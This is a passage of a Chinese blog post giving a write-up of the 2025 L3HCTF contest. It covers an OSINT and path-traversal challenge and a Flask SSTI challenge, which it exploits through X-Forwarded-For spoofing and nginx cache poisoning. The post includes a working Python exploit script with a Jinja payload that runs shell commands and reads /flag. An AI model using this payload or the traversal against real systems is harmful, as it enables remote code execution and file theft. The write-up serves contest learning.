<!DOCTYPE html>
<html lang="zh-CN" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="author" content="s3ven" />
  <!-- Open Graph Description ç®€çŸ­æ‘˜è¦-->
  
  <meta property="og:site_name" content="s3ven&#39;s blog">
  
  
  <!-- ç”¨äºæœç´¢å¼•æ“çš„æ–‡ç« æ‘˜è¦ -->
  
  <!-- æ–‡ç« é¡µ -->
  <meta name="description" content="æœ¬æ–‡ä¸ºç¬¬ä¹å±ŠXCTFå›½é™…ç½‘ç»œæ”»é˜²è”èµ›åˆ†ç«™èµ›L3HCTF(2025 L3HCTF)çš„WriteUpï¼Œæä¾›äº†ä½œè€…åœ¨è§£å†³&#34;èµ›åšä¾¦æ¢&#34;,&#34;best_profile&#34;,&#34;gateway_advance&#34;,&#34;gogogoå‡ºå‘å–½&#34;,&#34;TellMeWhy&#34;,&#34;PaperBack&#34;,&#34;é‡å­åŒç”Ÿå½±&#34;ç­‰å¤šé“CTFèµ›é¢˜æ—¶çš„è§£é¢˜æ€è·¯ä»¥åŠé¢˜ç›®çš„ç›¸å…³è€ƒç‚¹åˆ†æã€‚" />
  
  
  
  <title>2025 L3HCTF WriteUp | s3ven&#39;s blog</title>

  
    <link rel="apple-touch-icon" href="/images/favicon.png">
    <link rel="icon" href="/images/favicon.png">
  

  <!-- Font -->
  <link href="https://npm.elemecdn.com/lxgw-wenkai-webfont/style.css" rel="stylesheet" >
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  <link rel="stylesheet" href="/css/main.css" />
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
  <!-- ä»£ç å—é£æ ¼ -->
  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="../../js/fancybox.js"></script>


  

  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 7.3.0"></head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- å¤´åƒå–æ¶ˆæ‡’åŠ è½½ï¼Œæ·»åŠ no-lazy -->
      
        <img src="/images/avatar.png" alt="">
      
    </a>
    <div class="nickname"><a href="/">s3ven's blog</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/categories/">
          <a href="/categories/">Categories</a>
        </li>
      
        <li class="nav-item" data-path="/tags/">
          <a href="/tags/">Tags</a>
        </li>
      
        <li class="nav-item" data-path="/links/">
          <a href="/links/">Links</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="../../js/activeNav.js"></script>



      <div class="flex-container">
        
  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="../../js/codeCopy.js"></script>







  

  

  

  
  <div class="container-wider post-details" id="post-details">
    <div class="zoom-wrap">
      <div class="post-content">
        <div class="post-title">2025 L3HCTF WriteUp</div>
        <div class="post-attach">
          <span class="post-pubtime">
            <i class="iconfont icon-updatetime mr-10" title="åˆ›å»ºæ—¶é—´"></i>
            2025-07-15
          </span>
          
                <span class="post-categories">
                  <i class="iconfont icon-bookmark mr-10" title="åˆ†ç±»"></i>
                  
                  <span class="span--category">
                    <a href="../../categories/write-up/" title="Write Up">
                      Write Up
                    </a>
                  </span>
                  
                </span>
            
                <span class="post-tags">
                  <i class="iconfont icon-tags mr-10" title="æ ‡ç­¾"></i>
                  
                  <span class="span--tag mr-8">
                    <a href="../../tags/php/" title="PHP">
                      #PHP
                    </a>
                  </span>
                  
                  <span class="span--tag mr-8">
                    <a href="../../tags/java/" title="Java">
                      #Java
                    </a>
                  </span>
                  
                  <span class="span--tag mr-8">
                    <a href="../../tags/python/" title="Python">
                      #Python
                    </a>
                  </span>
                  
                  <span class="span--tag mr-8">
                    <a href="../../tags/nginx/" title="Nginx">
                      #Nginx
                    </a>
                  </span>
                  
                  <span class="span--tag mr-8">
                    <a href="../../tags/openresty/" title="OpenResty">
                      #OpenResty
                    </a>
                  </span>
                  
                </span>
            
        </div>
        <div class="markdown-body">
          
<style id="hexo-wm">
.hexo-wm {
  color: transparent !important;
  opacity: 0 !important;
  font-size: 0 !important;
  line-height: 0 !important;
  pointer-events: none !important;
  user-select: text !important;
  -webkit-user-select: text !important;
  speak: none !important;
  vertical-align: baseline !important;
  display: inline !important;
}

.hexo-wm * { color: transparent !important; opacity: 0 !important; }
</style>
<html><head></head><body><blockquote>
<p>Rank 5</p>
</blockquote>
<p><img src="image-1.png" alt="image-1.png"></p>
<h1 id="1-èµ›åšä¾¦æ¢"><a href="#1-èµ›åšä¾¦æ¢" class="headerlink" title="1. èµ›åšä¾¦æ¢"></a>1. èµ›åšä¾¦æ¢</h1><blockquote>
<p>çœ‹ä¼¼ Web <span class="hexo-wm">Ñ•â€‹ğŸ¯veğ’Â·<span class="hexo-wm">ğ˜€â€‹â€ŒÂ³vï½…ï½Â·â€Œğ˜€ğ¢ï»¿ï»¿tï½…â€Œ</span>â€ŒÑ•iâ€Œâ€Œï½”ğ˜¦â€â€</span>å®åˆ™ç¤¾å·¥ Misc</p>
</blockquote>
<p>æ‰“å¼€åæ˜¯ä¸€ä¸ªç±»ä¼¼<span class="hexo-wm">ğ’”â€‹â€ğŸ¯ğ˜·ï½…ğ˜¯â€¢â€â€‹êœ±ğ˜ªâ€â€Œğ˜µï½…â€</span>æœ‹å‹åœˆçš„é¡µé¢ï¼š<br><img src="image-2.png" alt="image-2.png"></p>
<h2 id="1-1-æ‰¾å›å¯†ç åœ°å€"><a href="#1-1-æ‰¾å›å¯†ç åœ°å€" class="headerlink" title="1.1 æ‰¾å›å¯†ç åœ°å€"></a>1.1 æ‰¾å›å¯†ç åœ°å€</h2><p>ä»Bç«™è·³è½¬é“¾æ¥ä¸­è·<span class="hexo-wm">ğ˜´â€â€â‘¶ğ¯ï½…ğ’â€¢â€‹â€Œêœ±iâ€‹â€ğ­ï½…â€‹</span>å¾—æ‰¾å›å¯†ç åœ°å€ï¼š<br><img src="image-3.png" alt="image-3.png"></p>
<p><a href="http://61.147.171.103:63169/go/CB6R8pq">http://61.147.171.103:<span class="hexo-wm">êœ±â€‹â€ğŸ¯ğ’—enâ€¢â€Œêœ±iâ€ğ˜µï½…â€</span>63169/go/CB6R8pq</a></p>
<pre class="language-none"><code class="language-none">$ curl -vvv http://61.147.171.103:63169/go/CB6R8pq

HTTP/1.1 302 FOUND
Server: Werkzeug/3.1.3 Python/3.13.5
Date: Mon, 14 Jul 2025 00:52:39 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1193
Location: https://www.bilibili.com/video/BV1tT421e7r3/?from_url=http://61.147.171.103:63169/secret/find_my_password&amp;buvid=XU729158D436618067C9318686801E96CB45D&amp;from_spmid=tm.recommend.0.0&amp;is_story_h5=false&amp;p=1&amp;plat_id=116&amp;share_from=ugc&amp;share_medium=android&amp;share_plat=android&amp;share_session_id=422b97e2-06ad-4b22-a034-6f23ac237e51&amp;share_source=COPY&amp;share_tag=s_i&amp;spmid=united.player-video-detail.0.0&amp;timestamp=1751785740&amp;unique_k=CB6R8pq&amp;up_id=552601798</code></pre>

<p>æ‰¾å›å¯†ç åœ°å€: <a href="http://61.147.171.103:63169/secret/find_my_password">http://61.147.171.103:<span class="hexo-wm">ğ’”â€ğŸ¯ğ˜·eï½âˆ™â€‹â€ğ’”ğ¢â€‹ğ˜µâ„®â€Œ</span>63169/secret/find_my_password</a></p>
<p><img src="image-4.png" alt="image-4.png"></p>
<h2 id="1-2-é‚®ç®±åœ°å€"><a href="#1-2-é‚®ç®±åœ°å€" class="headerlink" title="1.2 é‚®ç®±åœ°å€"></a>1.2 é‚®ç®±åœ°å€</h2><p>ä»é¡µé¢ä¸­ä¸‹è½½ <code>xiaoshuo.docx</code> æ–‡ç¨¿<br><img src="image-5.png" alt="image-5.png"></p>
<p>ä» docx çš„ <span class="hexo-wm">ğ˜€â€Œâ‘¶vâ„¯ğ§Â·â€Œâ€‹sğ¢â€ğ­eâ€â€</span>metadata ä¸­è·å¾—é‚®ç®±åœ°å€: <a href="mailto:leland@l3hsec.com">leland@l3hsec.com</a>;</p>
<p><img src="image-6.png" alt="image-6.png"></p>
<h2 id="1-3-è€å®¶åŸå¸‚å’Œè‹±æ–‡å§“å"><a href="#1-3-è€å®¶åŸå¸‚å’Œè‹±æ–‡å§“å" class="headerlink" title="1.3 è€å®¶åŸå¸‚å’Œè‹±æ–‡å§“å"></a>1.3 è€å®¶åŸå¸‚å’Œè‹±æ–‡å§“å</h2><p>æ‰«ææœºç¥¨ä¸­çš„äºŒç»´ç <span class="hexo-wm">sâ€â€‹ğŸ¯ğ’—ğï½Â·â€‹ğ˜€ğ˜ªâ€ğ’•ğâ€ï»¿</span>è·å¾—æœºç¥¨ä¿¡æ¯ï¼š<br><img src="image-7.png" alt="image-7.png"></p>
<p><img src="image-8.png" alt="image-8.png"></p>
<p>ä½¿ç”¨ AI è§£ç åˆ†æï¼š<br><img src="image-9.png" alt="image-9.png"><br>å‘ç°èˆªç­ä¸ºæ­¦æ±‰å¤©æ²³æœºåœºåˆ°ç¦å·é•¿ä¹å›½é™…æœºåœºï¼Œ<span class="hexo-wm">Ñ•â€‹â€‹3ğ¯ğ˜¦ğ˜¯â€¢â€Œsâ…ˆâ€Œtğ˜¦â€‹â€‹</span>ç»“åˆæœ‹å‹åœˆæ–‡æ¡ˆè¯´æ˜è€å®¶ä¸ºç¦å·å¸‚ï¼Œè‹±æ–‡å§“åä¸ºLELAND</p>
<h2 id="1-4-å®¶é‡Œåº—é“ºä½ç½®"><a href="#1-4-å®¶é‡Œåº—é“ºä½ç½®" class="headerlink" title="1.4 å®¶é‡Œåº—é“ºä½ç½®"></a>1.4 å®¶é‡Œåº—é“ºä½ç½®</h2><p>æ ¹æ®å‘¨è¾¹åœ°ç†ä½ç½®ä¿¡æ¯åŠå…¶è·ç¦»è·å¾—å®¶é‡Œåº—é“ºçš„ä½ç½®<br><img src="image-10.png" alt="image-10.png"><br>ä½¿ç”¨ <a href="https://api.map.baidu.com/lbsapi/getpoint/">ç™¾åº¦åœ°å›¾åæ ‡æ‹¾å–ç³»ç»Ÿ</a> æ‹¾å–å‘¨è¾¹åœ°ç†ä¿¡æ¯çš„ç»çº¬åº¦ï¼Œ<span class="hexo-wm">ğ’”â€â€‹ğŸ¯ğ’—â„¯ğ’Â·ï»¿ğ˜´ğ˜ªâ€‹tğ˜¦ï»¿â€</span>å¹¶ç»“åˆè·ç¦»è®¡ç®—é‡åˆä½ç½®</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pygeodesy <span class="token keyword">import</span> sphericalNvector <span class="token keyword">as</span> nv

p1 <span class="token operator">=</span> nv<span class="token punctuation">.</span>LatLon<span class="token punctuation">(</span><span class="token number">30.611436</span><span class="token punctuation">,</span> <span class="token number">114.195324</span><span class="token punctuation">)</span>
p2 <span class="token operator">=</span> nv<span class="token punctuation">.</span>LatLon<span class="token punctuation">(</span><span class="token number">30.634363</span><span class="token punctuation">,</span> <span class="token number">114.202718</span><span class="token punctuation">)</span>
p3 <span class="token operator">=</span> nv<span class="token punctuation">.</span>LatLon<span class="token punctuation">(</span><span class="token number">30.643873</span><span class="token punctuation">,</span> <span class="token number">114.162743</span><span class="token punctuation">)</span>

d1<span class="token punctuation">,</span> d2<span class="token punctuation">,</span> d3 <span class="token operator">=</span> <span class="token number">2300</span><span class="token punctuation">,</span> <span class="token number">2800</span><span class="token punctuation">,</span> <span class="token number">2500</span>

sol <span class="token operator">=</span> nv<span class="token punctuation">.</span>trilaterate<span class="token punctuation">(</span>p1<span class="token punctuation">,</span> d1<span class="token punctuation">,</span> p2<span class="token punctuation">,</span> d2<span class="token punctuation">,</span> p3<span class="token punctuation">,</span> d3<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"ä¼°è®¡ä½ç½®: </span><span class="token interpolation"><span class="token punctuation">{</span>sol<span class="token punctuation">.</span>lat<span class="token punctuation">:</span><span class="token format-spec">.6f</span><span class="token punctuation">}</span></span><span class="token string">, </span><span class="token interpolation"><span class="token punctuation">{</span>sol<span class="token punctuation">.</span>lon<span class="token punctuation">:</span><span class="token format-spec">.6f</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"ä¸ p1 çš„æ®‹å·®: </span><span class="token interpolation"><span class="token punctuation">{</span>sol<span class="token punctuation">.</span>distanceTo<span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">.2f</span><span class="token punctuation">}</span></span><span class="token string"> m"</span></span><span class="token punctuation">)</span></code></pre>
<p>å¾—åˆ°å®¶é‡Œåº—é“ºç»çº¬åº¦: <span class="hexo-wm">sâ€ŒğŸ¯ğ’—ï½…ï½â€¤â€Œğ˜´ğ¢â€tï½…â€</span>114.175692,30.623971</p>
<p><img src="image-11.png" alt="image-11.png"></p>
<h2 id="1-5-ç›®å½•ç©¿è¶Šä»»è¯»"><a href="#1-5-ç›®å½•ç©¿è¶Šä»»è¯»" class="headerlink" title="1.5 ç›®å½•ç©¿è¶Šä»»è¯»"></a>1.5 ç›®å½•ç©¿è¶Šä»»è¯»</h2><p>è¾“å…¥ä¸Šè¿°ä¿¡æ¯åè·³è½¬åˆ°: <a href="http://61.147.171.103:63169/secret/my_lovely_photos">http://61.147.171.103:63169/secret/my_lovely_photos</a><br><img src="image-12.png" alt="image-12.png"></p>
<p>å‘ç°å›¾ç‰‡é“¾æ¥ä¸º: <a href="http://61.147.171.103:63169/secret/my_lovely_photo?name=airport.png">http://61.147.171.103:<span class="hexo-wm">êœ±â€‹â‘¶ğ˜·eğ˜¯ï¼â€Œï»¿êœ±iâ€ï½”ğâ€Œ</span>63169/secret/my_lovely_photo?name=airport.png</a></p>
<p>ä¿®æ”¹ name ä¸º flag è¿”å›å¦‚ä¸‹ä¿¡æ¯ï¼š<br><img src="image-13.png" alt="image-13.png"><br>ä½¿ç”¨è·¯å¾„ç©¿è¶Šè·å¾—flag: <a href="http://61.147.171.103:63169/secret/my_lovely_photo?name=../../../flag">http://61.147.171.103:<span class="hexo-wm">Ñ•â€Œâ€3ğ˜·ğ˜¦ï½â€¢â€Œâ€êœ±ğ˜ªï»¿â€‹ğ­ğ˜¦â€‹â€‹</span>63169/secret/my_lovely_photo?name=../../../flag</a></p>
<pre class="language-none"><code class="language-none">L3HCTF{F1ndL3l4ndAndTr4v3rs3TheP4th}</code></pre>

<h1 id="2-best-profile"><a href="#2-best-profile" class="headerlink" title="2. best_profile"></a>2. best_profile</h1><h2 id="2-1-SSTI-æ¨¡æ¿æ³¨å…¥æ¼æ´"><a href="#2-1-SSTI-æ¨¡æ¿æ³¨å…¥æ¼æ´" class="headerlink" title="2.1 SSTI æ¨¡æ¿æ³¨å…¥æ¼æ´"></a>2.1 SSTI æ¨¡æ¿æ³¨å…¥æ¼æ´</h2><p><code>/ip_detail/&lt;string:username&gt;</code> è·¯ç”±ä¸­å­˜åœ¨ SSTI æ¨¡æ¿æ³¨å…¥æ¼æ´</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/ip_detail/&lt;string:username&gt;"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">route_ip_detail</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>
    template <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""
    &lt;h1&gt;IP Detail&lt;/h1&gt;
    &lt;div&gt;</span><span class="token interpolation"><span class="token punctuation">{</span>last_ip<span class="token punctuation">}</span></span><span class="token string">&lt;/div&gt;
    &lt;p&gt;Country:</span><span class="token interpolation"><span class="token punctuation">{</span>country<span class="token punctuation">}</span></span><span class="token string">&lt;/p&gt;
    """</span></span>
    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>template<span class="token punctuation">)</span></code></pre>

<p>å…¶ä¸­ last_ip å­—æ®µå¯æ§ï¼Œå¯ä»¥æ„é€ å¯¹åº”çš„ SSTI Payload å¦‚ä¸‹ï¼š</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span> self<span class="token punctuation">.</span>_TemplateReference__context<span class="token punctuation">.</span>cycler<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>

<h2 id="2-2-xff-å¤´ä¼ªé€ -last-ip"><a href="#2-2-xff-å¤´ä¼ªé€ -last-ip" class="headerlink" title="2.2 xff å¤´ä¼ªé€  last_ip"></a>2.2 xff å¤´ä¼ªé€  last_ip</h2><p>set_last_ip çš„ä½ç½®å¦‚ä¸‹ï¼š</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>after_request</span>
<span class="token keyword">def</span> <span class="token function">set_last_ip</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>
        current_user<span class="token punctuation">.</span>last_ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr
        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> response</code></pre>

<p>æ³¨æ„åˆ°è¿™é‡Œä½¿ç”¨äº† <span class="hexo-wm">ğ’”â€ï»¿â‘¶vâ„¯ï½â€¤â€‹â€Œğ¬ï½‰â€‹â€Œğ˜µâ„®â€‹â€</span>ProxyFixï¼š</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>middleware<span class="token punctuation">.</span>proxy_fix <span class="token keyword">import</span> ProxyFix
app<span class="token punctuation">.</span>wsgi_app <span class="token operator">=</span> ProxyFix<span class="token punctuation">(</span>app<span class="token punctuation">.</span>wsgi_app<span class="token punctuation">)</span></code></pre>

<p>ProxyFix ä¼šæŠŠæœ€åä¸€å±‚ä»£ç†ä¸­çš„ X-Forwarded-<span class="hexo-wm">Ñ•â€ï»¿Â³vâ„¯ğ§â€¤â€Œğ˜€iâ€‹â€ğ­ï½…ï»¿</span>For å¤´å½“ä½œ request.remote_addr å¤„ç†ï¼Œå› æ­¤è¯¥å­—æ®µå¯ä»¥é€šè¿‡ X-Forwarded-For header è¿›è¡Œæ§åˆ¶</p>
<h2 id="2-3-nginx-é¡µé¢ç¼“å­˜åˆ©ç”¨"><a href="#2-3-nginx-é¡µé¢ç¼“å­˜åˆ©ç”¨" class="headerlink" title="2.3 nginx é¡µé¢ç¼“å­˜åˆ©ç”¨"></a>2.3 nginx é¡µé¢ç¼“å­˜åˆ©ç”¨</h2><p>æ¨¡æ¿æ³¨å…¥å¤„çš„ <span class="hexo-wm">sâ€â€Œâ‘¶â…´ï½…ğ§âˆ™ï»¿ï»¿Ñ•iâ€ğ­eï»¿</span>last_ip æ¥è‡ªï¼š</p>
<pre class="language-python" data-language="python"><code class="language-python">res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://127.0.0.1:5000/get_last_ip/</span><span class="token interpolation"><span class="token punctuation">{</span>username<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">"Get last ip failed."</span>
last_ip <span class="token operator">=</span> res<span class="token punctuation">.</span>text</code></pre>

<p>ä½†æ˜¯ <code>/get_last_ip/{username}</code> api éœ€è¦é‰´æƒåæ‰èƒ½æ­£å¸¸è·å–ï¼Œ<span class="hexo-wm">ğ¬â€‹ï»¿â‘¶â…´ğğ§â€¤â€Œğ˜€ğ¢â€â€ğ­â„®ï»¿</span>å¹¶ä¸”è¿™é‡Œä½¿ç”¨çš„æ˜¯ requestsï¼Œä¸èƒ½ç¼“å­˜ä»»ä½•çš„ cookie ç­‰ä¿¡æ¯</p>
<p>æ³¨æ„åˆ° nginx.conf <span class="hexo-wm">ğ˜€ï»¿ï»¿Â³â…´â„¯ï½â€¢ï»¿Ñ•iâ€‹ï»¿ï½”ï½…â€‹</span>ä¸­åŒ…å«å¦‚ä¸‹é¡µé¢ç¼“å­˜ç­–ç•¥ï¼š</p>
<pre class="language-c" data-language="c"><code class="language-c">location <span class="token operator">~</span> <span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">.</span><span class="token punctuation">(</span>gif<span class="token operator">|</span>jpg<span class="token operator">|</span>jpeg<span class="token operator">|</span>png<span class="token operator">|</span>bmp<span class="token operator">|</span>swf<span class="token punctuation">)</span>$ <span class="token punctuation">{</span>
    proxy_ignore_headers Cache<span class="token operator">-</span>Control Expires Vary Set<span class="token operator">-</span>Cookie<span class="token punctuation">;</span>
    proxy_pass http<span class="token operator">:</span><span class="token comment">//127.0.0.1:5000;</span>
    proxy_cache <span class="token keyword">static</span><span class="token punctuation">;</span>
    proxy_cache_valid <span class="token number">200</span> <span class="token number">302</span> <span class="token number">30</span>d<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

location <span class="token operator">~</span> <span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">.</span><span class="token punctuation">(</span>js<span class="token operator">|</span>css<span class="token punctuation">)</span><span class="token operator">?</span>$ <span class="token punctuation">{</span>
    proxy_ignore_headers Cache<span class="token operator">-</span>Control Expires Vary Set<span class="token operator">-</span>Cookie<span class="token punctuation">;</span>
    proxy_pass http<span class="token operator">:</span><span class="token comment">//127.0.0.1:5000;</span>
    proxy_cache <span class="token keyword">static</span><span class="token punctuation">;</span>
    proxy_cache_valid <span class="token number">200</span> <span class="token number">302</span> <span class="token number">12</span>h<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>

<p>ä»¥ä¸Šè¿°è¿™äº›åç¼€ç»“å°¾çš„è·¯ç”±çš„é¡µé¢å†…å®¹ä¼šåœ¨é¦–æ¬¡è®¿é—®æ—¶è¢«ç¼“å­˜ï¼Œ<span class="hexo-wm">ğ’”ï»¿ğŸ¯â…´â„¯ğ˜¯âˆ™â€â€ŒÑ•â…ˆï»¿â€ğ’•eâ€Œ</span>åœ¨åç»­ç¼“å­˜æœ‰æ•ˆæœŸå†…çš„è®¿é—®ç”± nginx ç›´æ¥è¿”å›ç¼“å­˜ä¿¡æ¯</p>
<p>è€Œæˆ‘ä»¬éœ€è¦æ§åˆ¶çš„è·¯ç”±ä»¥ username ç»“å°¾ï¼Œusername å¯ä»¥é€šè¿‡æ³¨å†ŒåŠŸèƒ½æ¥è¿›è¡Œæ§åˆ¶ï¼Œå› æ­¤åªéœ€è¦æ³¨å†Œå¹¶ä½¿ç”¨ä»¥ä¸Šè¿°åç¼€ç»“å°¾çš„ <span class="hexo-wm">ğ˜´â€‹â€‹â‘¶veï½â€¤ï»¿â€‹ğ’”ğ¢ï»¿ï»¿ğ˜µâ„®â€Œâ€Œ</span>username å³å¯åˆ©ç”¨ nginx ç¼“å­˜åŠŸèƒ½å®ç°ç›®æ ‡é¡µé¢å†…å®¹çš„æ§åˆ¶ï¼Œä»è€Œè§¦å‘ SSTI</p>
<p>Expï¼š</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

URL <span class="token operator">=</span> <span class="token string">"http://ip:port"</span>
user<span class="token punctuation">,</span> pwd <span class="token operator">=</span> <span class="token string">"hacker.css"</span><span class="token punctuation">,</span> <span class="token string">"pass"</span>
sess <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">"{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen(request.args.c).read() }}"</span>

<span class="token comment"># æ³¨å†Œ &amp; ç™»å½•</span>
sess<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>URL<span class="token punctuation">}</span></span><span class="token string">/register"</span></span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> user<span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> pwd<span class="token punctuation">,</span> <span class="token string">"bio"</span><span class="token punctuation">:</span> <span class="token string">"hi"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span>
sess<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>URL<span class="token punctuation">}</span></span><span class="token string">/login"</span></span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> user<span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> pwd<span class="token punctuation">}</span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token comment"># å°† payload å†™å…¥ last_ip</span>
profile <span class="token operator">=</span> sess<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>URL<span class="token punctuation">}</span></span><span class="token string">/profile"</span></span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token comment"># è§¦å‘ nginx ç¼“å­˜ payload é¡µé¢</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>sess<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>URL<span class="token punctuation">}</span></span><span class="token string">/get_last_ip/</span><span class="token interpolation"><span class="token punctuation">{</span>user<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span>

<span class="token comment"># è¯»å– flag</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>sess<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>URL<span class="token punctuation">}</span></span><span class="token string">/ip_detail/</span><span class="token interpolation"><span class="token punctuation">{</span>user<span class="token punctuation">}</span></span><span class="token string">?c=cat /flag"</span></span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre>

